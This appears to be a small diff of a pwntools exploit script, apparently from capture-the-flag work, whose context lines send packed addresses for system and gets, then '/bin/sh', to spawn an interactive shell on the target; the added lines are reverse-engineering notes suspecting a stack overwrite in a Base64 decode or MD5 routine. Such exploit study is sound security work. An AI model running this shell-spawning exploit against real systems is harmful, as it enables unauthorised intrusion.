@@ -20,3 +20,9 @@ p.send(p32(entry)+p32(system)+p32(gets))
 p.sendline('/bin/sh\x00')
 p.interactive()
 p.close()
+
+Base64Decode -> var_20ch
+cal_md5 <- var_20ch
+    -> eax -> var_210h
+
+could be var_20c overwriting stack addr in decode or cal_md5
